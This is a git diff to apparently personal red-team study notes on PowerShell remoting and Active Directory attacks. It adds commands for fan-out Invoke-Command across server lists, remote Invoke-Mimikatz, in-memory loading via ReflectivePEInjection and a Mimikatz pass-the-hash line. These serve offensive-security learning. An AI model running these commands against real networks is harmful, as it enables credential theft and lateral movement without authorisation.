@@ -253,6 +253,7 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInterative -NoProfile -File w
     - `$ses = New-PSSession -ComputerName <name> -Credential <cred>`
     - `Get-PSSession`
     - `Enter-PSSession`
+  - Interactive session: `Enter-PSSession -Sessions $ses`
   - Define a function in a remote machine and call it:
     ```
     Invoke-Command -ScriptBlock {function Example1 {whoami;}} -Session $ses
@@ -283,22 +284,33 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInterative -NoProfile -File w
 - One to Many (Fan-out Remoting)
   - Non-interactive
   - Parallel command execution
-  - Can execute scripts from files
-  - Usable to perform command execution without dropping exe onto disk
-  - Useful for passing and replying hashes, tickets and other AD attacks
-  - Run commands: `Invoke-Command -ScriptBlock{whoami;hostname} -ComputerName instance`
-  - Run scripts: `Invoke-Command -FilePath example.ps1 -ComputerName instance`
-  - Run functions installed on the remote box: `Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName instance`
+  - Can:
+    - Execute scripts from files
+    - Run commands on multiple remote computers
+    - Run commands in disconnected sessions (v3)
+    - Run as background task
+  - Useful in:
+    - Perform command execution without dropping exe onto disk
+    - Useful for passing and replying hashes, tickets and other AD attacks
+  - Run commands: 
+    - `Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName instance`
+    - `Invoke-Command -ScriptBlock {Get-Process} -ComputerName (Get-Content <list-of-servers>)`
+  - Run scripts: 
+    - `Invoke-Command -FilePath example.ps1 -ComputerName instance`
+  - Run functions installed on the remote box: 
+    - `Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName instance`
+  - `Invoke-Command` doesn't create a session.
   - Stateful commands:
-  ```
-  $sess = New-PSSession -ComputerName instance
-  Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process}
-  Invoke-Command -Session $sess -ScriptBlock {$proc.Name}
-  ```
+    ```powershell
+    $sess = New-PSSession -ComputerName instance
+    Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process}
+    Invoke-Command -Session $sess -ScriptBlock {$proc.Name}
+    ```
 
 ## Tools
 
 - Mimikatz (ReflectivePEInjection is used to load into memory)
+  - Uses `ReflectivePEInjection` <https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/> to load mimikatz into memory
   - Pass the Hash
     ```
     Invoke-Mimikatz -Command '"sekurlsa::pth /user:<name_of_the_user> /domain:. /ntlm:<ntlmhash> /run:powershell.exe"'
